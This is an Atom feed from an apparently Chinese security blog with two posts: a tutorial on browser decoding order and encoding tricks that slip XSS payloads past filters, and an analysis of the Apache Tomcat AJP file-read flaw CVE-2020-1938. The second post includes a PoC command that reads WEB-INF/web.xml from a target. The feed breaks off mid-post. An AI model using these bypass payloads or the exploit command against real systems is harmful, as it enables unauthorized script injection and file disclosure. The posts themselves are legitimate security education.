<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Alexchihir&#39;blog</title>
  
  <subtitle>副标题</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-05-24T13:34:57.202Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Alexhirchi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浏览器解析与编码绕过</title>
    <link href="http://example.com/2021/05/25/tag/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2021/05/25/tag/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E4%B8%8E%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</id>
    <published>2021-05-24T22:00:00.000Z</published>
    <updated>2021-05-24T13:34:57.202Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浏览器解析与编码绕过"><a href="#浏览器解析与编码绕过" class="headerlink" title="浏览器解析与编码绕过"></a>浏览器解析与编码绕过</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前对于编码绕过并没有做过了解，于是每次测试都是先每种编码都试一试，各种绕过payload放进去碰碰运气。直到最近打国赛，因为对编码绕过没有系统认识导致没做出来。于是开始思考，浏览器到底是如果解析编码问题的？</p><h2 id="0x01-浏览器解析"><a href="#0x01-浏览器解析" class="headerlink" title="0x01 浏览器解析"></a>0x01 浏览器解析</h2><p><strong>首先了解数据包处理过程：</strong></p><p>1、在浏览器的地址栏中输入url，发送 http 请求头和数据</p><p>2、数据包通过网络传输到达远程web服务器，服务器接收到url，分析请求头，根据它找到对应资源，经过后端代码进行处理（过滤，校验），然后给前端返回响应头和数据。</p><p>3、浏览器接收到响应的数据后，对数据进行解析（<strong>这里是我们要关注的地方</strong>）</p><p><strong>浏览器解析分为三步：</strong></p><p>（1）HTML 解析（HTML解析器）</p><p>（2） JS 解析（JavaScript解析器）</p><p>（3） URL 解析（URL解析器）</p><p><strong>将解析流程再具体点就是：</strong></p><p><strong>步骤一：</strong>浏览器接收到响应数据，HTML解析器先对HTML的文档进行解析，将HTML标签转化构建成DOM节点树，同时CSS会被CSS解析器解析生成样式表。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/3.png" alt="html转换图"></p><p><strong>步骤二：</strong>在解析HTML标签过程中，当遇到&lt;script&gt;标签（或触发js解析器的条件），则暂停HTML标签解析，将控制权转交给JavaScript引擎，执行完后继续解析html，js可以对DOM进行修改。</p><p><strong>可以触发JavaScript解析器的条件</strong></p><ul><li>直接嵌入&lt; script&gt; 代码块。</li><li>通过&lt; script sr=… &gt; 加载代码。</li><li>各种HTML CSS 参数支持JavaScript：URL 触发调用。</li><li>CSS expression(…) 语法和某些浏览器的XBL 绑定。</li><li>事件处理器(Event handlers),比如 onload, onerror, onclick等等。</li><li>定时器，Timer(setTimeout, setInterval)</li><li>eval(…) 调用。</li></ul><p><strong>步骤三：</strong>最后URL解析器对存在的URL进行解码，但URL解析会根据文档中URL的实际位置不同而在不同的时间解析，例如遇到Onclick事件需要触发才会执行的代码会先跳过，等到事件被触发时才会被解析（具体例子看后面的说明）</p><h2 id="0x02-浏览器解码"><a href="#0x02-浏览器解码" class="headerlink" title="0x02 浏览器解码"></a>0x02 浏览器解码</h2><blockquote><p>需要注意的是“浏览器解析顺序和浏览器解码顺序是两件事。并且区分浏览器URL解码和服务器URL解码，后者过程是由服务器完成的，而不是浏览器</p></blockquote><p><strong>解释器是如何自动解码的？</strong></p><p>根据浏览器解析过程，HTML 解析器会根据 HTML 标签对 HTML 的文档进行解析转成 DOM 节点树，在转换前它会先识别是否存在HTML实体编码，如果存在则自动执行。（注意执行解析器是通过标志触发的，它们不会识别被编码的标志，只会当做字符串）</p><p>因此我们可以简单理解为解析器在解析前会先根据识别的<strong>标志</strong>，进行一次解码</p><p>浏览器看到<code>&lt;</code>满足HTML解析器的条件，进行解码；看到<code>href</code> 满足了URL解析器的条件，进行解码；看到<code>javascript </code>、 <code>&lt;script&gt;</code>等满足JS解析器的条件，进行解码。</p><p><strong>常见编码</strong></p><p>HTML字符实体：编码格式为 “&#xx; ”   例如 : &amp;lt; &amp;#60;</p><p>JavaScript编码：编码为Unicode码       例如：\u003C</p><p>URL编码： 编码格式为 %+ASCII 对应值  例如 ：%20</p><h3 id="HTML解码"><a href="#HTML解码" class="headerlink" title="HTML解码"></a>HTML解码</h3><p>浏览器接收到页面数据，开始进行HTML 解析，构造DOM树。注意在DOM树未构造完成前，HTML 解析器是无法识别哪些被实体编码的内容的，只有建立起DOM 树后，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。（因此对HTML标签的实体编码是无法解码的）</p><p>所以，<strong>HTML 的分析器只能识别特定的词法规则</strong>，<strong>才能构建起DOM 树</strong>，这一块，HTML 不会做解码的工作，因为它做不了。所以，试图这样构造利用漏洞，是不可能的，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&amp;#x3d;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;&gt;</span><br></pre></td></tr></table></figure><p>如果是这样就能解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.&amp;#x62;&amp;#x61;&amp;#x69;&amp;#x64;&amp;#x75;.com&quot;&gt;</span><br></pre></td></tr></table></figure><p>主要是弄清楚浏览器的解析顺序，再比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>该代码无法实现弹框，因为 script 标签内无法解析 HTML 实体编码。（具体为什么可以回到前面的<strong>浏览器解析部分</strong>，在解析HTML标签过程中，当遇到 &lt;script&gt; 标签，其控制权会转交到 JavaScript 解析器）</p><h3 id="JavaScript解码"><a href="#JavaScript解码" class="headerlink" title="JavaScript解码"></a>JavaScript解码</h3><p>JS编码的规则相对来说比较严谨，它对除了阿拉伯数字和字母外的东西都进行了一个编码。</p><p>但需要注意在js中，JavaScript 转义编码不能用于对语法有真正影响的符号。<strong>单引号，双引号和圆括号等属于控制字符，编码后将无法识别。</strong></p><p>例如：下面这条语句无法解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&gt;</span><br></pre></td></tr></table></figure><p>但下面这种方式可以解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)&gt;</span><br></pre></td></tr></table></figure><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>对于 URL解码，实际上根据文档中 URL 的实际位置不同其解析的时间也不同，有些在 js 前，有些在 js 后</p><h3 id="综合实例"><a href="#综合实例" class="headerlink" title="综合实例"></a>综合实例</h3><p>举几个综合的例子能更好的理解：</p><p><strong>例子1：</strong></p><p>对于下面这个原始代码：点击按钮触发弹窗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;button&quot; name&#x3D;&quot;demo&quot; onclick&#x3D;&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><p>浏览器看到<code>&lt;</code>满足HTML解码的条件，然后看到<code>onclick</code>满足js 解码的条件</p><p>因此解码顺序是：html解码 -&gt;javascript解码</p><p>我们进行如下编码，可以成功执行（先js编码再html编码）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">name</span>=<span class="string">&quot;demo&quot;</span>  <span class="attr">onclick</span>=<span class="string">&quot;<span class="symbol">&amp;#x5C;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x5C;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x5C;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x5C;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x5C;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>例子2：</strong></p><p>对于下面这个原始代码：点击 text 执行弹窗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href &#x3D; &quot;javascript:alert(3)&quot;&gt;text&lt;a&gt;</span><br></pre></td></tr></table></figure><p>浏览器看到 <code>&lt;</code> 满足HTML解码的条件，然后看到 <code>href</code> 满足了URL编码额条件，最后看到 <code>javascript</code> 满足JS 解码的条件</p><p>他的解码顺序是：html解码 -&gt;url解码 -&gt;javascript解码</p><p>我们依次进行如下编码，也可以成功执行（JS 编码 -&gt; url编码 -&gt; html编码）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#JS编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;</span>&gt;</span>text<span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#URL编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&quot;javascript:%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074%283%29&quot;</span>&gt;</span>text<span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#HTML编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&quot;<span class="symbol">&amp;#x6A;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3A;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x43;</span><span class="symbol">&amp;#x75;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x38;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x39;</span>&quot;</span>&gt;</span>text<span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x03-编码绕过遵守规则"><a href="#0x03-编码绕过遵守规则" class="headerlink" title="0x03 编码绕过遵守规则"></a>0x03 编码绕过遵守规则</h2><blockquote><p>并不是随意的编码构造都会被服务器执行，这里需要注意一些无法执行的编码问题</p></blockquote><p><strong>1、HTML元素（标签和属性）不支持HTML实体编码</strong></p><p><strong>2、RCDATA元素标签内无法执行脚本</strong></p><p>在浏览器解析<code>RCDATA</code>元素的过程中，解析器会进入<code>“RCDATA状态”</code>。在这个状态中，唯一能够被解析器认做是标签的就是<code>&lt;/textrea&gt;</code> 或<code>&lt;/title&gt;</code>。其他全为字符串。</p><p><strong>3、JavaScript 转义编码不能用于对语法有真正影响的符号（例如：<code>&quot;</code> 、<code>&#39;</code>、<code>()</code>）</strong></p><p>例子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;1&#x27;)&lt;/script&gt; #原代码</span><br><span class="line">----------------------------------------</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#x27;1&#x27;)&lt;/script&gt;   #可执行</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028&#x27;1&#x27;)&lt;/script&gt;  #不可执行</span><br></pre></td></tr></table></figure><p><strong>4、JavaScript标签内无法进行HTML实体解析</strong></p><p>但使用&lt;svg&gt;可以实现，其属于外部标签，使用XML格式定义图像，支持XML解析，xml支持在标签内解析HTML实体字符，所以在XML中&amp;#40;会被解析成（，因此<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;/script&gt;</code>是可以被解析的</p><p><strong>5、当某些函数的执行改变了当前页面的DOM树结构，HTML解析器会再次执行解析。</strong></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>其实总的来说，在编码绕过上，只要了解清楚浏览器解析的流程和熟悉触发各自解析器的标签，就基本上能理清楚了。对于攻击者，最主要的还是弄明白代码的执行逻辑，清楚其执行顺序后构造就非常容易了。但反过来对于开发者，安全编码值得重视，对于编码，不可以逃避，在构建安全的过滤规则的时候，一定要考虑清楚各种可能的编码绕过的方式,以避免损失。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;浏览器解析与编码绕过&quot;&gt;&lt;a href=&quot;#浏览器解析与编码绕过&quot; class=&quot;headerlink&quot; title=&quot;浏览器解析与编码绕过&quot;&gt;&lt;/a&gt;浏览器解析与编码绕过&lt;/h1&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class</summary>
      
    
    
    
    
    <category term="bypass" scheme="http://example.com/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>apache Tomcat 文件包含漏洞（CVE-2020-1938）</title>
    <link href="http://example.com/2021/05/24/tag/apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2020-1938)/"/>
    <id>http://example.com/2021/05/24/tag/apache%20Tomcat%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2020-1938)/</id>
    <published>2021-05-23T22:00:00.000Z</published>
    <updated>2021-05-25T13:50:30.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="apache-Tomcat-文件包含漏洞（CVE-2020-1938）"><a href="#apache-Tomcat-文件包含漏洞（CVE-2020-1938）" class="headerlink" title="apache Tomcat 文件包含漏洞（CVE-2020-1938）"></a>apache Tomcat 文件包含漏洞（CVE-2020-1938）</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>漏洞编号</strong>：CVE-2020-1938</p><p><strong>漏洞简介</strong>：由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可利用文件包含进一步实现远程代码执行。</p><p><strong>影响范围</strong>：</p><p><strong>受影响版本</strong></p><ul><li>Apache Tomcat 6</li><li>Apache Tomcat 7 &lt; 7.0.100</li><li>Apache Tomcat 8 &lt; 8.5.51</li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><p><strong>不受影响版本</strong></p><ul><li>Apache Tomcat = 7.0.100</li><li>Apache Tomcat = 8.5.51</li><li>Apache Tomcat = 9.0.31</li></ul><h3 id="0x01漏洞复现"><a href="#0x01漏洞复现" class="headerlink" title="0x01漏洞复现"></a>0x01漏洞复现</h3><p>使用Poc：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 目标IP -p 8009 -f &#x2F;WEB-INF&#x2F;web.xml</span><br></pre></td></tr></table></figure><p>读取 <code>WEB-INF/web.xm</code> 配置文件</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img1.png"></p><h3 id="0x02-知识点补充"><a href="#0x02-知识点补充" class="headerlink" title="0x02 知识点补充"></a>0x02 知识点补充</h3><h4 id="AJP-协议"><a href="#AJP-协议" class="headerlink" title="AJP 协议"></a>AJP 协议</h4><p>AJP（Apache JServ Protocol）是定向包协议，用于传输可读文本信息，支持 AJP 协议的 Web 容器包括 Apache Tomcat，JBoss AS / WildFly 和 GlassFish。，允许 WEB服务器和 SERVLET容器之间保持持久性的 TCP 连接。一般用于将 Tomcat 服务器与其他服务器的连接，为了提高服务器效率。</p><p><strong>使用场景：</strong></p><p>在很多高流量的生产环境中，通常会使用多台 Tomcat服务器组成 Tomcat 集群，但 Tomcat 一般性的作用是作为serverlet 容器来加载动态资源, 它虽然可以作为类似于apache、nginx、IIS等web容器去处理静态资源的请求，但性能不高，无法满足业务需求。</p><p>于是为了解决静态资源的请求，通常网络管理员会将 Tomcat 集群放置在 Apache Web服务器后面。通过这样的组合，Apache服务器用于提供静态内容和代理请求，以平衡整个网络中的请求负载，同时能让 Tomcat 服务器专注于提供动态内容。但</p><p>如果客户端请求的是静态页面，只需 Apache 服务器响应请求；如果客户端请求动态页面，则由 Tomcat 服务器响应请求，将解析的 JSP 等网页代码解析后回传给Apache服务器，再经 Apache 返回给客户端端。这样 Tomcat 只做动态代码解析，Apache 回传解析好的静态代码，Apache+Tomcat 整合可以减少 Tomcat 的服务开销。</p><p>But 正常情况下，Tomcat 是无法与 Apache web服务器连接的，因此 Tomcat 需要通过 AJP 协议与其他服务器集成，AJP 协议实现 Tomcat 与 Apache Web服务器进行通信。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img2.png"></p><h4 id="Tomcat-Connector-连接器"><a href="#Tomcat-Connector-连接器" class="headerlink" title="Tomcat Connector(连接器)"></a><strong>Tomcat Connector(连接器)</strong></h4><p>Connector 组件的主要职责就是负责接收客户端连接和客户端请求的处理加工。每个 Connector 会监听一个指定端口，分别负责对请求报文的解析和响应报文组装，解析过程封装 Request 对象，而组装过程封装 Response 对象。</p><p>在 Tomcat的配置文件conf/server.xml 中，默认配置了两个 Connector，分别监听两个不同的端口，一个是 HTTP Connector 默认监听8080端口，一个是 AJP Connector 默认监听8009端口。</p><p>监听 8080 端口，负责建立 HTTP连接，通过浏览器访问服务器 web应用</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img3.png"></p><p>监听 8009端口，通过 AJP 协议，负责与其他服务器建立连接，（将 Tomcat 与 Apache 连接）</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img4.png"></p><p><strong>一般有两种方式请求web服务</strong><br>第一种：请求tomcat服务器8080 端口 直接请求。<br>第二种：生产环境常用，在 web用户和 tomcat 之间架设一个web服务器，用户首先请求Web服务器，然后由web服务器来请求tomcat,这样做的好处是在前面的web服务器可以做集群和缓存，如果 web服务器和 Tomcat做的是短连接，这样的话就需要经常重新连接效率低，Tomcat在这里做了一个优化，架设了一个连接器叫做 AJP 的长连接，这样就减少了创建连接和关闭连接的次数。</p><h4 id="Servlet-服务程序"><a href="#Servlet-服务程序" class="headerlink" title="Servlet(服务程序)"></a>Servlet(服务程序)</h4><p>Servlet意为服务程序，也可简单理解为是一种用来处理网络请求的一套规范。主要作用是给上级容器(Tomcat)提供 doGet() 和 doPost() 等方法</p><p>Tomcat中 Servlet的配置是在 conf/web.xml。Tomcat默认配置定义了两个servlet，分别为 DefaultServlet 和 JspServlet：</p><p>所有的请求进入 tomcat，都会流经 servlet。如果请求没有匹配到任何应用指定的 servlet，那么就会流到默认的servlet (即 DefaultServlet)，而 JspServlet 负责处理所有 JSP 文件的请求。</p><h4 id="Tomcat内部请求流程"><a href="#Tomcat内部请求流程" class="headerlink" title="Tomcat内部请求流程"></a>Tomcat内部请求流程</h4><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img5.png"></p><h3 id="0x03-漏洞细节"><a href="#0x03-漏洞细节" class="headerlink" title="0x03 漏洞细节"></a>0x03 漏洞细节</h3><p>该漏洞主要是通过 AJP 协议（8009端口）触发。正是由于上文所述，Ajp协议的请求在 Tomcat 内的处理流程与Tomcat 处理 HTTP 请求流程类似。我们构造两个不同的请求，经过 tomcat内部处理流程，一个走 <code>default servlet</code>(DefaultServlet)，另一个走 <code>jsp servlet</code> (JspServlet)，可导致的不同的漏洞。</p><p><strong>文件读取漏洞走的是DefaultServlet，文件包含漏洞走的是JspServlet。</strong></p><p>下面开始逐一进行分析，测试使用的POC如下：</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><h4 id="利用一、文件读取"><a href="#利用一、文件读取" class="headerlink" title="利用一、文件读取"></a>利用一、文件读取</h4><p>通过构造AJP协议请求，以读取<code>WEB-INF/web.xml</code>文件为例。</p><p>payload： <code>python [CVE-2020-1938.py](http://cve-2020-1938.py/) IP -p 8009 -f WEB-INF/web.xm</code></p><p>对照POC中赋值了四个主要的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*# 请求*req_uri **&#x3D;** &#39;&#x2F;asdf&#39;</span><br><span class="line"></span><br><span class="line">*# AJP协议请求中的三个属性*</span><br><span class="line">javax**.**servlet**.**include**.**request_uri **&#x3D;** &#39;&#x2F;&#39;</span><br><span class="line">javax**.**servlet**.**include**.**path_info **&#x3D;** &#39;WEB-INF&#x2F;web.xml&#39;</span><br><span class="line">javax**.**servlet**.**include**.**servlet_path **&#x3D;** &#39;&#x2F;&#39;</span><br></pre></td></tr></table></figure><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img6.png"></p><p>下面通过Tomcat源码进行详细分析（更加具体细节可以参考文章 ：<a href="https://xz.aliyun.com/t/7683">https://xz.aliyun.com/t/7683</a>）</p><p><strong>流程一：<code>AjpProcessor类</code> -&gt; <code>service()</code> -&gt; <code>prepareRequest()</code></strong></p><blockquote><p>处理浏览器的请求，并对其封装发送给后端处理</p></blockquote><p>根据上文的 Tomcat 处理请求流程，请求首先到达 Connector，Connector 内使用 <code>AjpProcessor</code> 解析 Socket，将 Socket 中的内容封装到 Request 中。再通过 prepareRequest() 方法解析请求。然后再传到 CoyoteAdapter.java 文件，将请求转发给 Container。最后通过 <code>ApplicationFilterChain</code> 类的 <code>internalDoFilter()</code> 方法将流程走到 Servlet。</p><p><strong>流程二：DefaultServlet 类 -&gt; service() -&gt; doGet()</strong></p><p>由上文介绍的 Servlet 相关基础知识可知，该请求是非JSP文件请求（<code>WEB-INF/web.xml</code>），无法匹配到指定的servlet，所以会映射到默认的 servlet (defaultservlet)处理。tomcat源码有个  <code>DefaultServlet</code> 类（路径：org/apache/catalina/servlets/DefaultServlet.java）</p><p>首先进入 service() 方法，随后进入 doGet() 方法。</p><p>Ps：Servlet 处理请求：一般请求到达 servlet 后先执行 service() 方法，在方法中根据请求方式决定执行 doGet() 还是 doPost() 方法。</p><p><strong>流程三：getRelativePath()   关键点！！！</strong></p><blockquote><p>文件路径：<code>apache-tomcat-8.5.46-src\apache-tomcat-8.5.46-src\java\org\apache\catalina\servlets\DefaultServlet.java</code>  </p></blockquote><p>在doGet() 方法内直接进入  <code>serveResource()</code> 方法，我们直接看 <code>serveResource()</code> 方法的定义：</p><p>!(<a href="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img7.png">https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img7.png</a>)</p><p>这里通过 <code>getRelativePath()</code> 方法检查Request请求并将其存储为Path字符串。该方法的主要作用是确认请求的资源路径，其具体实现了什么我们继续看代码中的定义，进入该方法：可以看到三个很重要的参数（红框）。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img8.png" alt="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img%206.png"></p><p>这三个参数所对应的值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static final String INCLUDE_REQUEST_URI &#x3D; &quot;javax.servlet.include.request_uri&quot;;</span><br><span class="line">static final String INCLUDE_PATH_INFO &#x3D; &quot;javax.servlet.include.path_info&quot;;</span><br><span class="line">static final String INCLUDE_SERVLET_PATH &#x3D; &quot;javax.servlet.include.servlet_path&quot;;</span><br></pre></td></tr></table></figure><p>分别对应的POC中三个赋值参数，当执行POC，Poc中的参数就会代入 getRelativePath() 方法中，判断 <code>RequestDispatcher.INCLUDE_REQUEST_URI</code>的值为’/‘，不为空。pathInfo 和 servletPath 参数的值拼接成 result， <code>getRelativePath()</code>方法将 result返回，返回内容为：”/WEB-INF/web.xml “ 。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img9.png"></p><p><strong>流程4：getResource() -&gt; validate() -&gt; normalize()</strong></p><blockquote><p>获取读取文件路径，并对路径参数进行检查</p></blockquote><blockquote><p>该文件路径：apache-tomcat-8.5.46-src\apache-tomcat-8.5.46-src\java\org\apache\tomcat\util\http\RequestUtil.java</p></blockquote><p>进入 getResource() 方法，调用了 validate() 方法。在validate()方法内通过调用 <code>normalize()</code> 方法对 path 参数进行校验。</p><p><code>result = RequestUtil.normalize(path, true);</code></p><p>normalize() 方法主要的校验：</p><ul><li>判断 Path 中是否有 ‘ *<em>\*</em> ‘，如果有，转成 ‘ <strong>/</strong> ‘。</li><li>判断 Path 是否以‘ /’ 开头，如果不是，在Path前加 ‘/‘。</li><li>判断 Path 是否以 ‘/. ‘ 或’/..‘ 结尾，如果是，在Path最后加 ‘’。</li><li>判断 Path 是否包含’//‘，如果有装换成’/‘ 。</li><li>判断 Path  是否包含’/./‘ ，如果有将其删除。</li><li>判断 Path 是否包含/../ ，如果有，直接返回null结果。</li></ul><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img10.png"></p><p>当结果返回null，回到validate()方法，就会报非法参数异常并终止本次操作。因此请求路径中不能包含”/../“，<strong>也就导致了该漏洞只能读取webapps目录下的文件。</strong></p><p>我们的目的就是绕过 validate() 校验，getResources() 方法随后的一系列操作通过路径就可以被读取到资源。</p><p><strong>流程5：ServletOutputStream.write()</strong> </p><blockquote><p>读取返回资源到客户端</p></blockquote><p>最后通过 <code>getOutputStream()</code>方法获得 <code>ServletOutputStream</code> 的实例：</p><p>利用 <code>ServletOutputStream.write()</code>向输出流写入返回内容。</p><p>随后再经过Tomcat内部流程处理，经过 Tomcat的 <code>Container</code>和 